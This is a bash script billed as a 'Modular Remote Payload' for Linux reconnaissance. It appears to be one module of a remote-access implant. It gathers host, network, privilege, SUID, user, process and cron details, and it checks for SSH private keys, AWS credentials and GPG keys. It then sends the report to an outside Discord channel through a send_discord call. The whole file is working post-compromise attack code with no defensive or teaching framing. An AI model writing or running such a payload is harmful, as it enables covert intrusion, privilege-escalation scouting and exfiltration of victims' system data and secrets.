#!/bin/bash
# ============================================================
# Full Reconnaissance for Linux - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔍 **FULL RECON - $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# System
OUTPUT+="**💻 SYSTEM**\n"
OUTPUT+="• Hostname: \`$(hostname)\`\n"
OUTPUT+="• User: \`$(whoami)\`\n"
if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    OUTPUT+="• OS: \`$PRETTY_NAME\`\n"
fi
OUTPUT+="• Kernel: \`$(uname -r)\`\n"
OUTPUT+="• Arch: \`$(uname -m)\`\n\n"

# Network
OUTPUT+="**🌐 NETWORK**\n"
OUTPUT+="• IPs: \`$(hostname -I 2>/dev/null | tr ' ' ', ')\`\n"
PUB_IP=$(curl -s https://api.ipify.org 2>/dev/null)
OUTPUT+="• Public: \`$PUB_IP\`\n\n"

# Privileges
OUTPUT+="**🔐 PRIVILEGES**\n"
if sudo -n true 2>/dev/null; then
    OUTPUT+="• Sudo: ✅ Passwordless\n"
elif groups | grep -qE '(sudo|wheel)'; then
    OUTPUT+="• Sudo: ⚠️ With password\n"
else
    OUTPUT+="• Sudo: ❌ None\n"
fi

# SUID binaries
SUID=$(find /usr/bin /usr/sbin -perm -4000 2>/dev/null | head -5)
if [[ -n "$SUID" ]]; then
    OUTPUT+="• SUID binaries: \`$(echo $SUID | tr '\n' ', ')\`\n"
fi
OUTPUT+="\n"

# Users
OUTPUT+="**👥 USERS**\n"
OUTPUT+="• Logged in: \`$(who | awk '{print $1}' | sort -u | tr '\n' ', ')\`\n"
OUTPUT+="• Total users: \`$(wc -l < /etc/passwd)\`\n\n"

# Interesting files
OUTPUT+="**📁 INTERESTING FILES**\n"
[[ -f "$HOME/.ssh/id_rsa" ]] && OUTPUT+="• SSH Private Key: ✅\n"
[[ -f "$HOME/.aws/credentials" ]] && OUTPUT+="• AWS Creds: ✅\n"
[[ -f "$HOME/.gitconfig" ]] && OUTPUT+="• Git Config: ✅\n"
[[ -d "$HOME/.gnupg" ]] && OUTPUT+="• GPG Keys: ✅\n"

# Processes
OUTPUT+="\n**⚙️ TOP PROCESSES**\n"
OUTPUT+="\`\`\`$(ps aux --sort=-%cpu | head -6)\`\`\`\n"

# Cron
OUTPUT+="**⏰ CRON JOBS**\n"
CRON=$(crontab -l 2>/dev/null)
if [[ -n "$CRON" ]]; then
    OUTPUT+="\`\`\`$CRON\`\`\`\n"
else
    OUTPUT+="• No user cron jobs\n"
fi

send_discord "$OUTPUT"

